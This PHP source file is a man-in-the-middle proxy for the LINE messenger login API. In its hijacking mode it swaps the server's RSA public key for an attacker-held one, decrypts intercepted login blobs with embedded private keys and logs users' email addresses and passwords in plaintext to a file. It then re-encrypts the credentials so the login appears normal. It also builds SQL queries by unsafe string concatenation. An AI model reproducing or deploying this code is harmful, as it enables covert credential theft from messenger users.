<?
$offline_mode = 0;
$hijacking_mode = 0;

if (!function_exists('getallheaders')) 
{ 
    function getallheaders() 
    { 
           $headers = ''; 
       foreach ($_SERVER as $name => $value) 
       { 
           if (substr($name, 0, 5) == 'HTTP_') 
           { 
               $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value; 
           } 
       } 
       return $headers; 
    } 
} 

if ($_SERVER['HTTPS'] == 'on') {
	$u = 'https://';
} else {
	$u = 'http://';
}
$u .= $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
if (($_SERVER['REQUEST_URI'] == '/authct/v1/keys/naver') and ($offline_mode == 1)) {
	$fp = fopen('authct/v1/keys/naver', 'rb');
	header("Content-Type: text/json");
	header("Content-Length: " . filesize($name));

	fpassthru($fp);
	exit;
}
if ($_SERVER['REQUEST_URI'] == '/api/v4/TalkService.do') {
}
#$r = new HttpRequest('https://gd2.line.naver.jp/' . $_SERVER['REQUEST_URI'], HttpRequest::METH_POST);
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
	$r = new HttpRequest($u, HttpRequest::METH_POST);
	$r->addPostFields($_POST);
} else {
	$r = new HttpRequest($u, HttpRequest::METH_GET);
}
$r->setOptions(array('cookies' => $_COOKIE, 'proxyhost' => 'localhost', 'proxyport' => 8088, 'proxytype' => HTTP_PROXY_HTTP));
$hdr = Array();
	foreach (getallheaders() as $key => $val) {
			$hdr[$key] = $val;
	}

unset($hdr['Accept-Encoding']);
$hdr['Content-Type'] = "application/x-thrift";


$r->setHeaders($hdr);
$content = $HTTP_RAW_POST_DATA;
if ($hijacking_mode == 1 and strrpos($content, "loginWithIdentityCredentialForCertificate_disabled")) {
	$flag_login = 1;
	$debug_file = "line.log";
	$fp = fopen($debug_file, 'a');
	fwrite($fp, date('Y-m-d H:i:s'));
	fwrite($fp, "\n");
// if login process,
	// retrieve original data
	fwrite($fp, sprintf("content = %s\n", $content));

	$pattern = '/[a-z0-9]{202}/';
	// the wrapped preg_match call
	if (preg_match( $pattern, $content, $matches)) {
		// fwrite($fp, sprintf("matches = %s\n", var_dump($matches, true)));
		$mitm_rsa = $matches[0];
	} else {
		$mitm_rsa = substr($content, 61, 202);
	}

	fwrite($fp, sprintf("mitm_rsa = %s\n", $mitm_rsa));


// >>> privkey
// PrivateKey(1666415237814013526040871409548492116644849274499802652958603463760605208123317049354724362505232686756841348691481292857567921193866163785636366167253073188426087889774374950496736700633480221410759338884917443477945450311305612670297928518933, 65537, 1219737536932392829152701550514078563795312872083792869103318860439083751677304711194380695933228740768202381810737311140597811814753578929188304554437599213656513726376890648690322661672663345091916543347764337217379704829803182667020768686873, 1385410802051004972999068234954649781369491575273996857145798967708030654884999659532189932189627750525576188193030877704123430423, 1202831128028596933686485025485232486088747132700225745691721391288668581068999832233248231108086290726332806184371)
// >>> pubkey
// PublicKey(1666415237814013526040871409548492116644849274499802652958603463760605208123317049354724362505232686756841348691481292857567921193866163785636366167253073188426087889774374950496736700633480221410759338884917443477945450311305612670297928518933, 65537)

	include "rsalib.php";
	$public_key = "1666415237814013526040871409548492116644849274499802652958603463760605208123317049354724362505232686756841348691481292857567921193866163785636366167253073188426087889774374950496736700633480221410759338884917443477945450311305612670297928518933";
	$private_key = "1219737536932392829152701550514078563795312872083792869103318860439083751677304711194380695933228740768202381810737311140597811814753578929188304554437599213656513726376890648690322661672663345091916543347764337217379704829803182667020768686873";
	$modulus = "65537";
	$crypted = base2dec($mitm_rsa, 16);
	fwrite($fp, sprintf("crypted = %s\n", $crypted));
	
	// decrypt id/pw
	$mitm_original = rsa_decrypt($crypted, $public_key, $private_key, 808);
	fwrite($fp, sprintf("mitm_original = %s\n", $mitm_original));

	$strptr = 0;
	$session_key_length = ord($mitm_original[$strptr]);
	$strptr++;
	$session_key_org = substr($mitm_original, $strptr, $session_key_length);
	$strptr += $session_key_length;
	$email_length = ord($mitm_original[$strptr]);
	$strptr++;
	$email = substr($mitm_original, $strptr, $email_length);
	$strptr += $email_length;
	$passwd_length = ord($mitm_original[$strptr]);
	$strptr++;
	$passwd = substr($mitm_original, $strptr, $passwd_length);

	fwrite($fp, sprintf("%s %s %s\n", $session_key_org, $email, $passwd));
	

	$dir = 'sqlite:db/naver_key.db';
	$dbh  = new PDO($dir);
	if (!$dbh) {
	 	fwrite($fp, sprintf("cannot open the database\n"));
 		die("cannot open the database");
	}
	// die();
	$query = "SELECT * FROM naver_key WHERE session_key = '" . $session_key_org . "' ORDER BY key_id DESC LIMIT 1";
	
	if ($offline_mode == 1) {
		$query = "SELECT * FROM naver_key ORDER BY key_id DESC LIMIT 1";
	}
	$naver_keys = $dbh->query($query);
	foreach ($naver_keys as $row);
	$naver_key = $row;
	// if ($naver_key == "") {
	// 	die("no session key " . $session_key_org);
	// }

	$new_pub = $naver_key['rsa_key2'];
	fwrite($fp, sprintf("new_pub = %s\n", $new_pub));

	$new_pub2 = base2dec($new_pub, 16);
	fwrite($fp, sprintf("new_pub2 = %s\n", $new_pub2));
	
	$new_enc = rsa_encrypt($mitm_original, $modulus, $new_pub2, 808);
	fwrite($fp, sprintf("new_enc = %s\n", $new_enc));

	$new_enc_hexa = dec2base($new_enc,16);
	fwrite($fp, sprintf("new_enc_hexa = %s\n", $new_enc_hexa));

	$content = str_replace($mitm_rsa, $new_enc_hexa, $content);
	fwrite($fp, sprintf("content = %s\n", $content));
	
	// if ($offline_mode == 1) die();
	// encrypt with original id/pw


}
$r->setBody($content);
# $r->addPostFile('image', 'profile.jpg', 'image/jpeg');
$b = $r->send();
try {
#	foreach ($b->getHeaders() as $hk => $kv) {
#		header($hk.': ' .$kv);
#	}
	$body = $b->getBody();
	
	if ($_SERVER['REQUEST_URI'] == '/authct/v1/keys/naver' and $hijacking_mode == 1) {

/*
PrivateKey(9408900925360802225818591518914661252802938188188916746082270742599188404117776528077500724060665482048732279275034063887389473024438050859029846011406049
, 65537, 
8297123932730775638749620209235012554484340246120543593791792011032468605976688495581400834603602331253461242033172904235561216862994247895223708836759493
, 7081903082994167039118253657088513046750499192948499674578873098484960983610034159, 
1328583689312901573141519919127963441442480623120697684291268588907441711)


PublicKey(
9408900925360802225818591518914661252802938188188916746082270742599188404117776528077500724060665482048732279275034063887389473024438050859029846011406049, 
65537)

*/
		// 요청시 같은 값 sqlite3에 저장하고 보여주기 
		$result = $body;
		// result = {"session_key":"ZUo9bfjTdnLrmIc0","rsa_key":"100007824,59C0251254DA1E50000FC9D192E1BB90ABE452F84391DD5B41F7314CE2DBD21B5FC45759DB21F05ABEABCD87E96E4795D422E6DC5846407C1D45CDBECFF545B585AA72C5E282F5F7BA082AC724D72A379E1C65666354C18703E7412E129E9FCD1DEEB0DE75,010001"}
		$naver_key = json_decode($result, true);
		$session_key = $naver_key['session_key'];
		$rsa_key = $naver_key['rsa_key'];
		$rsa_keys = split(',', $rsa_key);

		$dir = 'sqlite:db/naver_key.db';
		$dbh  = new PDO($dir) or die("cannot open the database");
		$query = sprintf("INSERT INTO naver_key (session_key, rsa_key1, rsa_key2, rsa_key3) VALUES ('%s', '%s', '%s', '%s')", $session_key, $rsa_keys[0], $rsa_keys[1], $rsa_keys[2]);
		$ok1 = $dbh->exec($query);

		// $public_key = "9408900925360802225818591518914661252802938188188916746082270742599188404117776528077500724060665482048732279275034063887389473024438050859029846011406049";
		// $private_key = "8297123932730775638749620209235012554484340246120543593791792011032468605976688495581400834603602331253461242033172904235561216862994247895223708836759493";
		// $modulus = "65537";
		$mitm_result = array("session_key"=> $session_key, "rsa_key" => join(",", array($rsa_keys[0], "F9E96940AC5D605FCEC4D973C05EA926735464FE33FCC5912DABB8F73AA624C12ED9324C021EDEC011658FCE316E9813F029412FCE188894EE0E69C96874A95463C4D1A32528F751A9262D2443A286C6B835799BF2B8E0E89B3678C104E46ABC705CFA4D15", "010001")));
		echo json_encode($mitm_result);
		die();
	}

	echo $body;
	if ($flag_login == 1) {
		fwrite($fp, sprintf("body = %s\n", $body));
		fclose($fp);
	}

} catch (HttpException $ex) {
	// @fclose($fp);
	error_log($ex);
	// echo $ex;
}
?>
